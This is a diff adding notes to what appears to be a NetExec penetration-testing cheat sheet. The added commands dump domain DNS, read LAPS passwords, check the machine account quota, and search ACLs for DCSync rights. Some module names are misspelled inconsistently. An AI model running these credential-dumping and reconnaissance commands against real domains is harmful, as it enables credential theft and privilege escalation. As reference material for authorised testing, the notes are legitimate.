@@ -447,6 +447,36 @@ nxc smb [$IP] -u [user] -p [pass] -M nanodump
 ## Remote Shell
 
 ## Modules
+### Popular Modules
+#### LDAP
+* Get-Network
+> Any domain user can dump the entire domains DNS, similar to a zone transfer.  
+```bash
+# Get IP's and hostnames
+nxc ldap [$IP] -u [user] -p [pass] -M get-network -o ALL=True
+```
+* laps
+> Dumps LAPS passwords for every computer a user has access to, or only a specific computer. Does support wildcards(*) when searching for computers.  
+```bash
+nxc ldap [$FQND] -u [user] -p [pass] -M laps
+```
+* MAQ (Machine Account Quota)
+> Indicates the number of computer accounts a user is allowed to create on the domain. Useful for Resource Based Constrained Delegation.  
+```bash
+nxc ldap [$FQDN] -u [user] -p [pass] -M maq
+```
+* dacleread
+> Allows us to read and export one or more domain object ACL's.  
+```bash
+# Usage
+nxc ldap [$FQDN] -u [user] -p [pass] -M daclread -o TARGET=[target] ACTION=read
+```
+```bash
+# Search for what users have a specific permission, such as DCSync
+nxc ldap [$FQDN] -u [user] -p [pass] -M dacleread -o TARGET-DN='DC=[DC Hostname],DC=[Domain]' ACTION=read RIGHTS=DCSync
+```
+#### SMB
+
 
 ## Misc
 
